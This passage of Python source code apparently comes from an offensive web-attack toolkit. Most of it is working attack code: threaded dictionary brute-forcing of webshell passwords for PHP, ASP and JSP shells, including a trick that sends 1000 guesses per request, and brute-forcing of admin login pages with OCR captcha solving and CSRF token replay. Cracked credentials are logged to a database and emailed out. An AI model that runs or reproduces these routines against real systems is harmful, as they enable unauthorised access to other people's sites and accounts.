    # 从url的get请求中获取所有form表单
    # 返回结果为一个字典,包含3个键值对
    #"user_form_name":"" 没有则相应返回值为None,不是返回""(空字符串)
    #"pass_form_name":"" 没有则相应返回值为None,不是返回""(空字符串)
    #"response_key_value":value 这个value的值是一个字典,也即get_request函数的返回结果
    # 之所以要每次在有访问url结果的函数里面返回url访问结果,这样是为了可以只访问一次url,这样就可以一直将访问的返\
    # 回结果传递下去,不用多访问,效率更高
    url = re.sub(r'(\s)$', '', url)
    response_key_value = get_request(url, by="seleniumPhantomJS")
    content = response_key_value['content']
    return_value = get_user_and_pass_form_from_html(content)
    return_value['response_key_value'] = response_key_value
    # print return_value
    return return_value


def get_yanzhengma_form_and_src_from_url(url):
    # 得到url对应的html中的验证码的表单名和验证码src地址
    parsed = urlparse(url)
    content = get_request(url, by="seleniumPhantomJS")['content']
    # sub useless html content
    content = re.sub(r"<!--.+-->","",content)
    yanzhengma_form_name = None
    yanzhengma_src = None
    user_pass_pattern = re.compile(
        r'''<input .*name=('|")?([^'"]{,7}user[^'"]{,7}).*>[\s\S]{,500}<input .*name=('|")?([^'"]{,7}pass[^'"]{,7}).*>([\s\S]*)''',
        re.I)
    find_user_pass_form = re.search(user_pass_pattern, content)
    if find_user_pass_form and find_user_pass_form.group(2) is not None \
            and find_user_pass_form.group(4) is not None:
        # user和pass表单之后剩下的内容
        content_left = find_user_pass_form.group(5)
        yanzhengma_pattern = re.compile(
            r'''<input .*name=('|")?([^'" ]{,20})('|")?.*>''', re.I)
        yanzhengma_src_pattern = re.compile(
            r'''<img .*src=('|")?([^'" ]{,80})('|")?.*>''', re.I)
        find_yanzhengma = re.search(yanzhengma_pattern, content_left)
        find_yanzhengma_src = re.search(yanzhengma_src_pattern, content_left)
        if find_yanzhengma and find_yanzhengma_src:
            # 目前认为只有同时出现验证码和验证码src的html才是有验证码的,否则如"记住登录"的选项会被误认为是验证码
            yanzhengma_form_name = find_yanzhengma.group(2)
            # print yanzhengma_form_name
            if find_yanzhengma_src:
                yanzhengma_src = find_yanzhengma_src.group(2)
                # print yanzhengma_src
                if re.match(r"http.*", yanzhengma_src):
                    yanzhengma_src_url = yanzhengma_src
                else:
                    pure_url = parsed.scheme + "://" + parsed.netloc + parsed.path
                    yanzhengma_src_url = url[
                        :(len(pure_url) - len(pure_url.split("/")[-1]))] + yanzhengma_src
            return {
                'yanzhengma_form_name': yanzhengma_form_name,
                'yanzhengma_src': yanzhengma_src_url}
    return None


def crack_ext_direct_webshell_url(url, pass_dict_file, ext):
    # 爆破php|asp|aspx|jsp的一句话类型的webshell
    # 表单形式爆破的webshell爆破起来方法一样,不用分类
    # 一句话形式的webshell爆破需要根据后缀对应的脚本的语法的不同来爆破
    def ext_direct_webshell_crack_thread(password,url,ext):
        if get_flag[0] == 1:
            return
        if ext in ["php", "asp", "aspx"]:
            pattern = re.compile(r"29289", re.I)
        if ext == "jsp":
            pattern = re.compile(r"->\|.+\|<-", re.I)

        if ext == "php":
            # php的echo 29289后面必须加分号
            # 后来发现这里不能用echo 29289,因为assert和echo不搭配[如果等待被暴破的webshell不是eval...而是
            # assert形式,这样的情况不能用echo来判断,因为assert不能执行echo]
            values = {'%s' % password: 'print_r("29289");'}
        elif ext == "asp":
            # asp后面不能加分号
            values = {'%s' % password: 'response.write("29289")'}
        elif ext == "aspx":
            # aspx后面可加可不加分号
            values = {'%s' % password: 'Response.Write("29289");'}
        elif ext == "jsp":
            # jsp一句话比较特殊,似乎没有直接执行命令的post参数
            # A后面没有分号
            # jsp一句话中:
            # A参数是打印当前webshell所在路径,post A参数返回内容如下
            #->|路径|<-  (eg.->|/home/llll/upload/custom |<-)
            # B参数是列目录
            # C参数是读文件
            # D,E,F,....参考jsp菜刀一句话服务端代码
            values = {'%s' % password: 'A'}

        data = urllib.parse.urlencode(values)
        try_time[0] += 1

        # post_request可处理表单post和无表单post,以及code=404的状况
        html = post_request(url, values)

        PASSWORD = "(" + password + ")" + (52 - len(password)) * " "
        sys.stdout.write('-' * (try_time[0] * 100 // (sum[0])) + '>' + str(try_time[0]
                                                                           * 100 // (sum[0])) + '%' + '%s/%s %s\r' % (try_time[0], sum[0], PASSWORD))
        sys.stdout.flush()

        if re.search(pattern, html):
            get_flag[0] = 1
            end = time.time()
            # print "\b"*30
            # sys.stdout.flush()
            print(Fore.RED + "congratulations!!! webshell cracked succeed!!!")
            string = "cracked webshell:%s password:%s" % (url, password)
            return_password[0] = password
            print(Fore.RED + string)
            print("you spend time:" + seconds2hms(end - start[0]))
            http_domain_value = get_http_domain_from_url(url)
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程

    def crack_ext_direct_webshell_url_inside_func(url, pass_dict_file, ext):
        urls = []
        exts = []
        passwords = []
        i = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")
        for each in f:
            urls.append(url)
            exts.append(ext)
            each = re.sub(r"(\s)$", "", each)
            passwords.append(each)
            i += 1
        f.close()
        sum[0] = i
        start[0] = time.time()

        # 这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成\
        # 功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可\
        # 参考下面文章
        # 后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        # http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            # 用executor.map不会出来，应该是死锁了,换成更细粒度的executor.submit方法
            executor.map(ext_direct_webshell_crack_thread,
                         passwords, urls, exts, timeout=30)

    # 这里要注意的是Fore等模块的导入要在需要时才导入,它与tab_complete_for_file_path函数冲突
    # 且导入的下面的语句也不能放到crack_webshell函数那里,那样ThreadPool.map()会无法知道Fore是个什么东西
    try:
        from colorama import init, Fore
        init(autoreset=True)
    except:
        os.system("pip3 install colorama")
        from colorama import init, Fore
        init(autoreset=True)

    get_flag = [0]
    try_time = [0]
    sum = [0]
    start = [0]
    return_password = [""]

    crack_ext_direct_webshell_url_inside_func(url, pass_dict_file, ext)
    return {'cracked': get_flag[0], 'password': return_password[0]}


def jieDiQi_crack_ext_direct_webshell_url(url, pass_dict_file, ext):
    # 爆破php|asp|aspx|jsp的一句话类型的webshell
    # 表单形式爆破的webshell爆破起来方法一样,不用分类
    # 一句话形式的webshell爆破需要根据后缀对应的脚本的语法的不同来爆破

    def ext_direct_webshell_crack_thread(password,url,ext):
        values = {}
        checkValues = {}
        if get_flag[0] == 1:
            return
        if ext in ["php", "asp", "aspx"]:
            pattern = re.compile(r"29289", re.I)
        if ext == "jsp":
            pattern = re.compile(r"->\|.+\|<-", re.I)

        if ext == "php":
            # php的echo 29289后面必须加分号
            # 后来发现这里不能用echo 29289,因为assert和echo不搭配[如果等待被暴破的webshell不是eval...而是
            # assert形式,这样的情况不能用echo来判断,因为assert不能执行echo]
            for each in password:
                values[each] = 'print_r("29289");'
                checkValues[each] = 'print_r("%s");' % each
        elif ext == "asp":
            # asp后面不能加分号
            for each in password:
                values[each] = 'response.write("29289")'
                checkValues[each] = 'response.write("%s")' % each
        elif ext == "aspx":
            # aspx后面可加可不加分号
            for each in password:
                values[each] = 'Response.Write("29289");'
                checkValues[each] = 'Response.Write("%s");' % each
        elif ext == "jsp":
            # jsp一句话比较特殊,似乎没有直接执行命令的post参数
            # A后面没有分号
            # jsp一句话中:
            # A参数是打印当前webshell所在路径,post A参数返回内容如下
            #->|路径|<-  (eg.->|/home/llll/upload/custom |<-)
            # B参数是列目录
            # C参数是读文件
            # D,E,F,....参考jsp菜刀一句话服务端代码
            for each in password:
                values[each] = 'A'

        #data = urllib.parse.urlencode(values)

        try_time[0] += 1

        # post_request可处理表单post和无表单post,以及code=404的状况
        html = post_request(url, values)

        sys.stdout.write('-' * (try_time[0] * 100 // (sum[0])) + '>' + str(try_time[0]
                                                                           * 100 // (sum[0])) + '%' + ' %s/%s\r' % (try_time[0], sum[0]))
        sys.stdout.flush()
        if re.search(pattern, html):
            get_flag[0] = 1
            # print "\b"*30
            # sys.stdout.flush()
            print(Fore.RED + "congratulations!!! find webshell password group,now try to get the only one password...")
            if ext != "jsp":
                # html即为密码内容
                html = post_request(url, checkValues)
                finalPassword = html
            else:
                for each in password:
                    postValues = {'%s' % each: 'A'}
                    html = post_request(url, postValues)
                    if re.search(pattern, html):
                        finalPassword = each
                        break

            string = "cracked webshell:%s password:%s" % (url, finalPassword)
            return_password[0] = finalPassword
            print(Fore.RED + string)
            end = time.time()
            print("you spend time:" + seconds2hms(end - start[0]))
            http_domain_value = get_http_domain_from_url(url)
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程

    def crack_ext_direct_webshell_url_inside_func(url, pass_dict_file, ext):
        urls = []
        exts = []
        passwords = []
        passwords_i = []
        i = 0
        j = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")

        for each in f:
            each = re.sub(r"(\s)$", "", each)
            if (j + 1) % 1000 != 0:
                passwords_i.append(each)
            if (j + 1) % 1000 == 0:
                passwords_i.append(each)
                passwords.append(passwords_i)
                urls.append(url)
                exts.append(ext)
                passwords_i = []
            i += 1
            j += 1

        if (j) % 1000 != 0:
            passwords.append(passwords_i)
            urls.append(url)
            exts.append(ext)

        f.close()
        sum[0] = i // 1000 + 1 + 1
        start[0] = time.time()

        # 这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成\
        # 功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可\
        # 参考下面文章
        # 后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        # http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        # 用接地气思路爆破webshell时不能用多线程,x1000倍爆破速度会让web server认为每次参数个数>1000
        '''
        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            # 用executor.map不会出来，应该是死锁了,换成更细粒度的executor.submit方法
            executor.map(ext_direct_webshell_crack_thread, passwords, urls, exts, timeout=30)
        '''
        for i in range(sum[0] - 1):
            ext_direct_webshell_crack_thread(passwords[i], url, ext)

    # 这里要注意的是Fore等模块的导入要在需要时才导入,它与tab_complete_for_file_path函数冲突
    # 且导入的下面的语句也不能放到crack_webshell函数那里,那样ThreadPool.map()会无法知道Fore是个什么东西
    try:
        from colorama import init, Fore
        init(autoreset=True)
    except:
        os.system("pip3 install colorama")
        from colorama import init, Fore
        init(autoreset=True)

    get_flag = [0]
    try_time = [0]
    sum = [0]
    start = [0]
    return_password = [""]

    crack_ext_direct_webshell_url_inside_func(url, pass_dict_file, ext)
    return {'cracked': get_flag[0], 'password': return_password[0]}


def get_csrf_token_value_from_html(html):
    html=re.sub(r"<!--.*-->","",html)
    param_part=get_param_part_from_content(html)
    find_csrf_token=re.search(r"([^&?]*token[^=]*)=([^&]+)",param_part,re.I)
    csrf_token_value=""
    if find_csrf_token:
        csrf_token_value=find_csrf_token.group(2)
    return csrf_token_value



def crack_admin_login_url(
        url,
        user_dict_file=ModulePath + "dicts/user.txt",
        pass_dict_file=ModulePath + "dicts/pass.txt",
        yanzhengma_len=0):
    # 这里的yanzhengma_len是要求的验证码长度,默认不设置,自动获得,根据不同情况人为设置不同值效果更好
    # 爆破管理员后台登录url,尝试自动识别验证码,如果管理员登录页面没有验证码,加了任意验证码数据也可通过验证
    import requests
    figlet2file("cracking admin login url", 0, True)
    print("cracking admin login url:%s" % url)
    print("正在使用吃奶的劲爆破登录页面...")

    def crack_admin_login_url_thread(url,username,password):
        global DB_NAME
        if get_flag[0] == 1:
            return


        try_time[0] += 1
        if requestAction=="GET":
            final_request_url=form_action_url
            final_request_url=re.sub(r"%s=[^&]*" % user_form_name,"%s=%s" %
                    (user_form_name,username),final_request_url)
            final_request_url=re.sub(r"%s=[^&]*" % pass_form_name,"%s=%s" %
                    (pass_form_name,password),final_request_url)
            if has_yanzhengma[0]:
                if needOnlyGetOneYanZhengMa:
                    yanzhengmaValue=onlyOneYanZhengMaValue
                else:
                    yanzhengmaValue=get_one_valid_yangzhengma_from_src(yanzhengma_src)

                final_request_url=re.sub(r"%s=[^&]*" % yanzhengma_form_name,"%s=%s" %
                        (yanzhengma_form_name,yanzhengmaValue),final_request_url)
                if hasCsrfToken:
                    final_request_url=re.sub(r"%s=[^&]*" % csrfTokenName,currentCsrfTokenPart[0],final_request_url)

            html=s.get(final_request_url).text

            if hasCsrfToken:
                csrfTokenValue=get_csrf_token_value_from_html(html)
                currentCsrfTokenPart[0]=csrfTokenPart+csrfTokenValue
        else:
            #post request
            paramPartValue=form_action_url.split("^")[1]
            paramList=paramPartValue.split("&")
            values={}
            for eachP in paramList:
                eachPList=eachP.split("=")
                eachparamName=eachPList[0]
                eachparamValue=eachPList[1]
                if eachparamName==user_form_name:
                    eachparamValue=username
                if eachparamName==pass_form_name:
                    eachparamValue=password
                values[eachparamName]=eachparamValue

            if has_yanzhengma[0]:
                if not needOnlyGetOneYanZhengMa:
                    values[yanzhengma_form_name]=get_one_valid_yangzhengma_from_src(yanzhengma_src)
                else:
                    values[yanzhengma_form_name]=onlyOneYanZhengMaValue

            if hasCsrfToken:
                values[csrfTokenName]=re.search(r"[^=]+=(.*)",currentCsrfTokenPart[0]).group(1)

            html = s.post(form_action_url.split("^")[0], values).text

            if hasCsrfToken:
                csrfTokenValue=get_csrf_token_value_from_html(html)
                currentCsrfTokenPart[0]=csrfTokenPart+csrfTokenValue

        USERNAME_PASSWORD = "(" + username + ":" + \
                password + ")" + (52 - len(password)) * " "
        # 每100次计算完成任务的平均速度

        left_time = get_remain_time(
                start[0],
                biaoji_time[0],
                remain_time[0],
                100,
                try_time[0],
                sum[0])
        remain_time[0] = left_time

        sys.stdout.write('-' * (try_time[0] * 100 // sum[0]) + '>' + str(try_time[0] * 100 // sum[0]) +
                '%' + ' %s/%s  remain time:%s  %s\r' % (try_time[0], sum[0], remain_time[0], USERNAME_PASSWORD))

        sys.stdout.flush()


        if len(html) > logined_least_length:
            # 认为登录成功
            get_flag[0] = 1
            end = time.time()
            CLIOutput().good_print(
                    "congratulations!!! admin login url cracked succeed!!!", "red")
            string = "cracked admin login url:%s username and password:(%s:%s)" % (
                    url, username, password)
            CLIOutput().good_print(string, "red")
            return_string[0]=string
            print("you spend time:" + str(end - start[0]))
            http_domain_value = get_http_domain_from_url(url)
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            table_name_list = get_target_table_name_list(http_domain_value)
            urls_table_name = http_domain_value.split(
                    "/")[-1].replace(".", "_") + "_urls"

            for each_table in table_name_list:
                auto_write_string_to_sql(
                    string,
                    DB_NAME,
                    each_table,
                    "cracked_admin_login_urls_info",
                    "http_domain",
                    http_domain_value)
            # 将urls表中cracked_admin_login_url_info字段标记为爆破结果信息
            execute_sql_in_db(
                "update `%s` set cracked_admin_login_url_info='%s' where url='%s'" %
                (urls_table_name, string, url),DB_NAME) 
            mail_msg_to(
                string,
                subject="cracked admin login url")

            return {'username': username, 'password': password}

    def crack_admin_login_url_inside_func(url, username, pass_dict_file):
        # urls和usernames是相同内容的列表
        urls = []
        usernames = []
        # passwords是pass_dict_file文件对应的所有密码的集合的列表
        passwords = []
        i = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")
        for each in f:
            urls.append(url)
            usernames.append(username)
            each = re.sub(r"(\s)$", "", each)
            passwords.append(each)
            i += 1
        f.close()
        sum[0] = usernames_num * i
        if needOnlyGetOneYanZhengMa or hasCsrfToken:
            max_workers=1
        else:
            max_workers=20
        with futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            executor.map(crack_admin_login_url_thread, urls, usernames, passwords)


    def get_one_valid_yangzhengma_from_src(yanzhengmaUrl):
        # 这里不用exp10it模块中打包好的get_request和post_request来发送request请求,因为要保留session在服务器需要
        #yanzhengma = get_string_from_url_or_picfile(yanzhengma_src)
        while 1:
            import shutil
            response = s.get(yanzhengmaUrl, stream=True)
            with open('img.png', 'wb') as out_file:
                shutil.copyfileobj(response.raw, out_file)
            del response
            yanzhengma = get_string_from_url_or_picfile("img.png")
            os.system("rm img.png")

            time.sleep(3)
            if re.search(r"[^a-zA-Z0-9]+", yanzhengma):
                # time.sleep(3)
                continue
            elif re.search(r"\s", yanzhengma):
                continue
            elif yanzhengma == "":
                continue
            else:
                if yanzhengma_len != 0:
                    if len(yanzhengma) != yanzhengma_len:
                        continue
                # print(yanzhengma)
                # print(len(yanzhengma))
                break
        return yanzhengma


    a=get_request(url,by="seleniumPhantomJS")
    get_result = get_user_and_pass_form_from_html(a['content'])
    user_form_name = get_result['user_form_name']
    pass_form_name = get_result['pass_form_name']
    if user_form_name is None:
        print("user_form_name is None")
        return
    if pass_form_name is None:
        print("pass_form_name is None")
        return
    form_action_url = a['formActionValue']
    #default request action=post
    requestAction="POST"
    if a['hasFormAction']:
        if "^" not in a['formActionValue']:
            requestAction="GET"
    else:
        print("url is not a admin login url entry")
        return

    get_flag = [0]
    return_string=[""]
    try_time = [0]
    sum = [0]
    start = [0]

    # 用来标记当前时间的"相对函数全局"变量
    biaoji_time = [0]
    # 用来标记当前剩余完成时间的"相对函数全局"变量
    tmp = time.time()
    remain_time = [tmp - tmp]
    # current_username_password={}

    has_yanzhengma = [False]
    find_yanzhengma = get_yanzhengma_form_and_src_from_url(url)
    if find_yanzhengma:
        yanzhengma_form_name = find_yanzhengma['yanzhengma_form_name']
        yanzhengma_src = find_yanzhengma['yanzhengma_src']
        has_yanzhengma = [True]

    hasCsrfToken=False
    forCsrfToken=get_url_has_csrf_token(url)
    if forCsrfToken['hasCsrfToken']:
        hasCsrfToken=True
        csrfTokenName=forCsrfToken['csrfTokenName']
        csrfTokenPart=csrfTokenName+"="
        currentCsrfTokenPart=[""]

    s = requests.session()
    # sesssion start place
    sessionStart=s.get(url)
    unlogin_length = len(sessionStart.text)
    # 如果post数据后返回数据长度超过未登录时的0.5倍则认为是登录成功
    logined_least_length = unlogin_length + unlogin_length / 2

    if hasCsrfToken:
        csrf_token_value=get_csrf_token_value_from_html(sessionStart.text)
        currentCsrfTokenPart=[csrfTokenPart+csrf_token_value]

    needOnlyGetOneYanZhengMa=False
    if has_yanzhengma[0]:
        if "^" in form_action_url:
            #post request
            print(get_value_from_url(form_action_url.split("^")[0])['y1'])
            if get_value_from_url(form_action_url.split("^")[0])['y1']!=get_value_from_url(a['currentUrl'])['y1']:
                # should update yanzhengma everytime
                needOnlyGetOneYanZhengMa=True
        else:
            #get request
            if get_value_from_url(form_action_url)['y1']!=get_value_from_url(a['currentUrl'])['y1']:
                needOnlyGetOneYanZhengMa=True
        if needOnlyGetOneYanZhengMa:
            print("Congratulation! Target login url need only one yanzhengma!!")

            import shutil
            response = s.get(yanzhengma_src, stream=True)
            with open('img.png', 'wb') as out_file:
                shutil.copyfileobj(response.raw, out_file)
            del response
            onlyOneYanZhengMaValue= input("Please open img.png and input the yanzhengma string:>")
            #get_string_from_url_or_picfile("img.png")
            os.system("rm img.png")


    with open(r"%s" % user_dict_file, "r+") as user_file:
        all_users = user_file.readlines()
        usernames_num = len(all_users)
        start[0] = time.time()
        for username in all_users:
            # 曾经双层多线程,没能跑完所有的组合,于是不再这里再开多线程
            username = re.sub(r'(\s)$', '', username)
            crack_admin_login_url_inside_func(a['currentUrl'], username, pass_dict_file)

    return return_string[0]



def crack_allext_biaodan_webshell_url(url, user_dict_file, pass_dict_file):
    # 爆破表单类型的webshell
    # 表单类型的webshell爆破方法一样,不用分不同脚本类型分别爆破
    def allext_biaodan_webshell_crack_thread(password,url):
        if get_flag[0] == 1:
            return
        pattern = re.compile(
            r".*((/home)|(c:)|(/phpstudy)|(/var)|(wamp)).*", re.I)
        values = {'%s' % pass_form_name: '%s' % password}
        try_time[0] += 1
        html = post_request(url, values)

        PASSWORD = "(" + password + ")" + (52 - len(password)) * " "
        sys.stdout.write('-' * (try_time[0] * 100 // (sum[0])) + '>' + str(try_time[0]
                                                                           * 100 // (sum[0])) + '%' + '%s/%s %s\r' % (try_time[0], sum[0], PASSWORD))
        sys.stdout.flush()

        if re.search(pattern, html) or len(html) - unlogin_length > 8000:
            get_flag[0] = 1
            end = time.time()
            CLIOutput().good_print("congratulations!!! webshell cracked succeed!!!", "red")
            string = "cracked webshell:%s password:%s" % (url, password)
            return_password[0] = password
            CLIOutput().good_print(string, "red")
            print("you spend time:" + seconds2hms(end - start[0]))
            http_domain_value = get_http_domain_from_url(url)
            # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            return password

    def crack_allext_biaodan_webshell_url_inside_func(
            url, user_dict_file, pass_dict_file):
        urls = []
        passwords = []
        i = 0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file = input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f = open(pass_dict_file, "r+")
        for each in f:
            urls.append(url)
            each = re.sub(r"(\s)$", "", each)
            passwords.append(each)
            i += 1
        f.close()
        sum[0] = i
        start[0] = time.time()

        # 这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成\
        # 功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可\
        # 参考下面文章
        # 后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        # http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(allext_biaodan_webshell_crack_thread,
                         passwords, urls, timeout=30)

    # 这里要注意的是Fore等模块的导入要在需要时才导入,它与tab_complete_for_file_path函数冲突
    # 且导入的下面的语句也不能放到crack_webshell函数那里,那样ThreadPool.map()会无法知道Fore是个什么东西
    try:
        from colorama import init, Fore
        init(autoreset=True)
    except:
        os.system("pip3 install colorama")
        from colorama import init, Fore
        init(autoreset=True)

    user_dict_file = ModulePath + "dicts/user.txt"
    pass_dict_file = ModulePath + "dicts/webshell_passwords.txt"
    user_form_name = get_user_and_pass_form_from_url(url)['user_form_name']
    pass_form_name = get_user_and_pass_form_from_url(url)['pass_form_name']
    # 这里如果字典中的返回键值对中的一个键对应的值为""(空字符串),那么返回的结果是"None"(一个叫做None的字符串)
    # print type(user_form_name)
    response_key_value = get_user_and_pass_form_from_url(url)[
        'response_key_value']
    unlogin_length = len(response_key_value['content'])

    get_flag = [0]
    try_time = [0]
    sum = [0]
    start = [0]
    current_password = [""]
    return_password = [""]

    if user_form_name is not None:
        while 1:
            if os.path.exists(user_dict_file) is False:
                print("please input your username dict:>", end=' ')
                user_dict_file = input()
                if os.path.exists(user_dict_file) is True:
                    break
            else:
                break

        crack_admin_login_url(url)

    else:
        if pass_form_name is not None:
            crack_allext_biaodan_webshell_url_inside_func(
                url, user_dict_file, pass_dict_file)

    return {'cracked': get_flag[0], 'password': return_password[0]}


def crack_webshell(url, anyway=0):
    # webshll爆破,第二个参数默认为0,如果设置不为0,则不考虑判断是否是webshll,如果设置为1,直接按direct_bao方式爆破
    # 如果设置为2,直接按biaodan_bao方式爆破
    global DB_NAME

    figlet2file("cracking webshell", 0, True)
    print("cracking webshell --> %s" % url)
    print("正在使用吃奶的劲爆破...")

    ext = get_webshell_suffix_type(url)
    tmp = check_webshell_url(url)
    url_http_domain = get_http_domain_from_url(url)
    table_name_list = get_target_table_name_list(url_http_domain)
    urls_table_name = url_http_domain.split(
        "/")[-1].replace(".", "_") + "_urls"
    if tmp['y2'] == 'direct_bao' or tmp['y2'] == 'biaodan_bao':
        # 如果检测到可能是webshell,将数据库中like_webshell_url字段标记为1,并将url加入到相应表中的
        # like_webshell_urls字段中
        # 这里还没开始爆webshell,只是检测是否为可疑webshell
        for each_table in table_name_list:
            auto_write_string_to_sql(
                url,
                DB_NAME,
                each_table,
                "like_webshell_urls",
                'http_domain',
                url_http_domain)
        execute_sql_in_db(
            "update `%s` set like_webshell_url='1' where url='%s'" %
            (urls_table_name, url),DB_NAME) 

    if anyway == 1 or tmp['y2'] == "direct_bao":

        serverType = getServerType(url)
        if re.search(r"(apache)|(iis)|(nginx)|(lighttpd)", serverType, re.I):
            return_value = jieDiQi_crack_ext_direct_webshell_url(
                url, ModulePath + "dicts/jieDiQi_webshell_passwords.txt", ext)
        else:
            return_value = crack_ext_direct_webshell_url(
                url, ModulePath + "dicts/webshell_passwords.txt", ext)

        if return_value['cracked'] == 0:
            print("webshell爆破失败 :(")
            return
        else:
            # 爆破成功将cracked_webshell_url_info标记为webshell密码信息,并将webshell密码信息加入到相应非urls表
            # 中的cracked_webshell_urls_info字段中
            strings_to_write = "webshell:%s,password:%s" % (
                url, return_value['password'])
            execute_sql_in_db(
                "update `%s` set cracked_webshell_url_info='%s' where url='%s'" %
                (urls_table_name, strings_to_write, url),DB_NAME) 
            for each_table in table_name_list:
                auto_write_string_to_sql(
                    strings_to_write,
                    DB_NAME,
                    each_table,
                    "cracked_webshell_urls_info",
                    'http_domain',
                    url_http_domain)
            mail_msg_to(
                strings_to_write,
                subject="cracked webshell url")
    elif anyway == 2 or tmp['y2'] == "biaodan_bao":
        # 大马类型提供表单名的webshell不能以1000倍速爆破,因为表单名确定,而一句话webshell中的不确定
        return_value = crack_allext_biaodan_webshell_url(
            url, ModulePath + "dicts/user.txt", ModulePath + "dicts/webshell_passwords.txt")

        if return_value['cracked'] == 0:
            print("webshell爆破失败 :(")
            return
        else:
            # 爆破成功将cracked_webshell_url_info标记为webshell密码信息,并将webshell密码信息加入到相应表中的
            # cracked_webshell_urls_info字段中
            strings_to_write = "webshell:%s,password:%s" % (
                url, return_value['password'])
            execute_sql_in_db(
                "update `%s` set cracked_webshell_url_info='%s' where url='%s'" %
                (urls_table_name, strings_to_write, url),DB_NAME) 
            for each_table in table_name_list:
                auto_write_string_to_sql(
                    strings_to_write,
                    DB_NAME,
                    each_table,
                    "cracked_webshell_urls_info",
                    'http_domain',
                    url_http_domain)
            mail_msg_to(
                strings_to_write,
                subject="cracked webshell url")

    elif tmp['y2'] == "bypass":
        print(
            Fore.RED +
            "congratulations!!! webshell may found and has no password!!!")
        string = "cracked webshell:%s no password!!!" % url
        print(Fore.RED + string)

        # 爆破成功将cracked_webshell_url_info标记为webshell密码信息,并将webshell密码信息加入到相应表中的
        # cracked_webshell_urls_info字段中
        strings_to_write = "webshell:%s,password:%s" % (
            url, return_value['password'])
        execute_sql_in_db(
            "update `%s` set cracked_webshell_url_info='%s' where url='%s'" %
            (urls_table_name, strings_to_write, url),DB_NAME) 
        for each_table in table_name_list:
            auto_write_string_to_sql(
                strings_to_write,
                DB_NAME,
                each_table,
                "cracked_webshell_urls_info",
                'http_domain',
                url_http_domain)
        mail_msg_to(strings_to_write,
                    subject="cracked webshell url")

        return

    else:
        print("这不是一个webshell :(")
        return


def exist_database(db_name):
    # 检测DB_NAME名字的数据库是否存在
    # 存在返回True,否则返回False
    result = execute_sql_in_db("show databases")
    if len(result) > 0:
        for each in result:
            if len(each) > 0 and each[0] == db_name:
                return True
    return False


def exist_table_in_db(table_name, db_name):
    # 检测数据库中存在表,存在返回True,否则返回False
    result = execute_sql_in_db("show tables", db_name)
    if len(result) > 0:
        for each in result:
            if len(each) > 0 and each[0] == table_name:
                return True
    return False


def set_column_name_scan_module_unfinished(column_name,scan_way):
    #set the scan module which has column_name to be unfinished
    #eg,column_name="cdn_scaned"
    global DB_NAME
    sqlList=[]

    tmpSql="update %s set %s='0'" % ("first_targets",column_name)
    sqlList.append(tmpSql)
    tmpSql="update %s set %s='0'" % ("targets",column_name)
    sqlList.append(tmpSql)
    tmpSql="update %s set pang_domains_%s='0'" % ("first_targets",column_name)
    sqlList.append(tmpSql)
    tmpSql="update %s set pang_domains_%s='0'" % ("targets",column_name)
    sqlList.append(tmpSql)
    tmpSql="update %s set sub_domains_%s='0'" % ("first_targets",column_name)
    sqlList.append(tmpSql)
    tmpSql="update %s set sub_domains_%s='0'" % ("targets",column_name)
    sqlList.append(tmpSql)
    for each in sqlList:
        execute_sql_in_db(each,DB_NAME)

    if scan_way in [1,3]:
        tmpSql="select table_name from information_schema.tables where table_schema='exp10itdb' and table_name regexp '.*_pang$'"
        result=execute_sql_in_db(tmpSql,DB_NAME)
        if len(result)>0:
            for each in result:
                each_table=each[0]
                tmpSql="update %s set %s='0'" % (each_table,column_name)
                execute_sql_in_db(tmpSql,DB_NAME)

    if scan_way in [2,3]:
        tmpSql="select table_name from information_schema.tables where table_schema='exp10itdb' and table_name regexp '.*_sub$'"
        result=execute_sql_in_db(tmpSql,DB_NAME)
        if len(result)>0:
            for each in result:
                each_table=each[0]
                tmpSql="update %s set %s='0'" % (each_table,column_name)
                execute_sql_in_db(tmpSql,DB_NAME)

def get_start_url_urls_table(start_url):
    # eg.http://www.baidu.com --> www_baidu_com_urls
    # eg.http://www.baidu.com/ --> www_baidu_com_urls
    # eg.http://www.baidu.com/cms/ --> www_baidu_com_cms_urls
    # eg.http://www.baidu.com/1.php --> www_baidu_com_urls
    # eg.http://www.baidu.com/cms --> www_baidu_com_cms_urls
    # eg.http://www.baidu.com/cms/1.php --> www_baidu_com_cms_urls
    # eg.http://www.baidu.com:40711 --> www_baidu_com_40711_urls
    # eg.http://www.baidu.com:40711/cms/1.php --> www_baidu_com_40711_cms_urls
    
